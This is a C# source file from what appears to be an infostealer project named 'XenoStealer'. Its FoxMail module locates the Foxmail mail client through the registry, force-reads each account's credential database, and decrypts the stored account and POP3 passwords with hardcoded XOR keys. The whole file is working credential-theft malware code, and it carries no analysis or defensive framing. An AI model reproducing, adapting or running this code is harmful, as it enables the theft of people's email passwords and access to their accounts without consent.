using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class FoxMail
    {
        private static byte[] V6Password = new byte[] { 0x7e, 0x64, 0x72, 0x61, 0x47, 0x6f, 0x6e, 0x7e };
        private static byte V6FirstByteDifference = 0x5A;
        private static byte[] V7Password = new byte[] { 0x7e, 0x46, 0x40, 0x37, 0x25, 0x6d, 0x24, 0x7e };
        private static byte V7FirstByteDifference = 0x71;

        public static DataExtractionStructs.FoxMailInfo[] GetInfo() 
        {
            string location=GetFoxMailLocation();
            if (location == null) 
            {
                return null;
            }
            string foxMailStoragePath = Path.Combine(location, "Storage");
            if (!Directory.Exists(foxMailStoragePath)) 
            {
                return null;
            }
            List<DataExtractionStructs.FoxMailInfo> foxMailInfos = new List<DataExtractionStructs.FoxMailInfo>();

            

            foreach (string emailDir in Directory.GetDirectories(foxMailStoragePath, "*@*")) 
            {
                string AccountDatabasePath = Path.Combine(emailDir, "Accounts", "Account.rec0");
                if (!File.Exists(AccountDatabasePath))
                {
                    continue;
                }
                byte[] databaseBytes = Utils.ForceReadFile(AccountDatabasePath);
                if (databaseBytes == null) 
                {
                    continue;
                }
                Dictionary<string, string[]> parsedStrings = parseRecFileStrings(databaseBytes, out bool v6);

                if (parsedStrings.ContainsKey("Account") && parsedStrings.ContainsKey("Password") && parsedStrings["Account"].Length == parsedStrings["Password"].Length)
                {
                    string[] accounts = parsedStrings["Account"];
                    string[] passwords = parsedStrings["Password"];
                    for (int i = 0; i < accounts.Length; i++) 
                    { 
                        string account = accounts[i];
                        string password = DecodePassword(passwords[i], v6);
                        bool foundMatch = false;
                        foreach (DataExtractionStructs.FoxMailInfo info in foxMailInfos) 
                        {
                            if (info.pop3) 
                            {
                                continue;
                            }
                            if (info.account == account && info.password == password) 
                            {
                                foundMatch = true;
                                break;
                            }
                        }
                        if (foundMatch) 
                        {
                            continue;
                        }
                        foxMailInfos.Add(new DataExtractionStructs.FoxMailInfo(account, password, false));
                    }
                }

                if (parsedStrings.ContainsKey("POP3Account") && parsedStrings.ContainsKey("POP3Password") && parsedStrings["POP3Account"].Length == parsedStrings["POP3Password"].Length) 
                {
                    string[] accounts = parsedStrings["POP3Account"];
                    string[] passwords = parsedStrings["POP3Password"];
                    for (int i = 0; i < accounts.Length; i++)
                    {
                        string account = accounts[i];
                        string password = DecodePassword(passwords[i], v6);
                        bool foundMatch = false;
                        foreach (DataExtractionStructs.FoxMailInfo info in foxMailInfos)
                        {
                            if (!info.pop3)
                            {
                                continue;
                            }
                            if (info.account == account && info.password == password)
                            {
                                foundMatch = true;
                                break;
                            }
                        }
                        if (foundMatch)
                        {
                            continue;
                        }
                        foxMailInfos.Add(new DataExtractionStructs.FoxMailInfo(account, password, true));
                    }
                }

            }

            return foxMailInfos.ToArray();
        }

        private static bool isAscii(int x)
        {
            return 32 <= x && x <= 127;
        }

        private static bool IsMatch(byte[] file, int start, byte[] pattern)
        {
            for (int i = 0; i < pattern.Length; i++)
            {
                if (file[start + i] != pattern[i])
                    return false;
            }
            return true;
        }

        private static Dictionary<string, string[]> parseRecFileStrings(byte[] fileBytes, out bool v6)
        {
            int IdentifierLength = sizeof(int);
            int stringIdentifierEnum = 256;
            int unicodeStringIdentifierEnum = 8;
            byte[] stringIdentifier = BitConverter.GetBytes(stringIdentifierEnum);//new byte[] { 0x00, 0x01, 0x00, 0x00 };
            byte[] unicodeStringIdentifier = BitConverter.GetBytes(unicodeStringIdentifierEnum);//new byte[] { 0x08, 0x00, 0x00, 0x00 };

            v6=fileBytes[0] == 0xD0;

            Dictionary<string, List<string>> strings = new Dictionary<string, List<string>>();

            for (int x = 0; x <= fileBytes.Length - IdentifierLength; x++)
            {
                bool MatchedUni = false;
                bool MatchedStr = false;
                if (IsMatch(fileBytes, x, stringIdentifier))
                {
                    MatchedStr = true;

                }
                else if (IsMatch(fileBytes, x, unicodeStringIdentifier))
                {
                    MatchedUni = true;
                }


                if (MatchedUni || MatchedStr)
                {
                    string key_buff = "";
                    string value_buff = "";
                    bool worked = false;
                    for (int i = x - 1; i > 0; i--)
                    {
                        try
                        {
                            if (isAscii(fileBytes[i]))
                            {
                                key_buff += (char)fileBytes[i];
                            }
                            else
                            {

                                int key_len = BitConverter.ToInt32(fileBytes, i - 3);//-3 because we do a x-1 at the start, in total -4, which is the size header size (int)
                                if (key_len != 0 && key_len == key_buff.Length)
                                {
                                    key_buff = Utils.ReverseString(key_buff);
                                    worked = true;
                                }
                                break;
                            }
                        }
                        catch
                        {
                            worked = false;
                            break;
                        }
                    }
                    if (worked)
                    {
                        try
                        {
                            if (MatchedStr)
                            {
                                int string_len = BitConverter.ToInt32(fileBytes, x + 4);
                                value_buff = Encoding.UTF8.GetString(fileBytes, x + 8, string_len);

                            }
                            else if (MatchedUni)
                            {
                                int string_len = BitConverter.ToInt32(fileBytes, x + 4) * 2;//*2 for the unicode length
                                value_buff = Encoding.Unicode.GetString(fileBytes, x + 8, string_len);
                            }

                        }
                        catch
                        {
                            worked = false;
                        }
                    }

                    if (worked)
                    {
                        if (!strings.ContainsKey(key_buff))
                        {
                            strings[key_buff] = new List<string>();
                        }
                        strings[key_buff].Add(value_buff);
                    }
                }

            }

            return strings.ToDictionary(
                kvp => kvp.Key,
                kvp => kvp.Value.ToArray()
            );
        }

        private static string GetFoxMailLocation() 
        {
            string FoxMailRegPath = @"SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command";
            object data=Utils.ReadRegistryKeyValue(Microsoft.Win32.RegistryHive.LocalMachine, FoxMailRegPath, "");
            if (data == null || data.GetType()!=typeof(string)) 
            {
                data = Utils.ReadRegistryKeyValue(Microsoft.Win32.RegistryHive.CurrentUser, FoxMailRegPath, "");
                if (data == null || data.GetType() != typeof(string)) 
                {
                    return null;
                }
            }

            string path = (string)data;

            int last_quote_index = path.LastIndexOf("\"");
            if (last_quote_index > 0)
            {
                string path_with_file = path.Substring(1, last_quote_index - 1);
                return Path.GetDirectoryName(path_with_file);
            }
            return null;

        }

        private static byte[] ExtendArrayByX(byte[] array, int x)
        {
            byte[] newArray = new byte[array.Length * x];
            for (int i = 0; i < x; i++)
            {
                Array.Copy(array, 0, newArray, array.Length * i, array.Length);
            }
            return newArray;
        }

        private static string DecodePassword(string password_hex, bool v6)
        {
            byte[] key = V7Password;
            byte firstByteDifference = V7FirstByteDifference;
            if (v6) 
            {
                key = V6Password;
                firstByteDifference = V6FirstByteDifference;
            }
            byte[] password_bytes = Utils.ConvertHexStringToByteArray(password_hex);
            if (password_bytes == null) 
            {
                return null;
            }
            int keyLength = (password_bytes.Length + key.Length - 1) / key.Length;
            key = ExtendArrayByX(key, keyLength);
            password_bytes[0] ^= firstByteDifference;
            byte[] password_buffer = new byte[password_bytes.Length];
            for (int i = 1; i <= password_buffer.Length - 1; i++)
            {
                password_buffer[i - 1] = (byte)(password_bytes[i] ^ key[i - 1]);
            }

            string result = "";

            for (int i = 0; i < password_buffer.Length - 1; i++)
            {
                int passwordChar = password_buffer[i] - password_bytes[i];
                if (passwordChar < 0)
                {
                    passwordChar += byte.MaxValue;
                }
                result += (char)passwordChar;
            }
            return result;
        }


    }
}
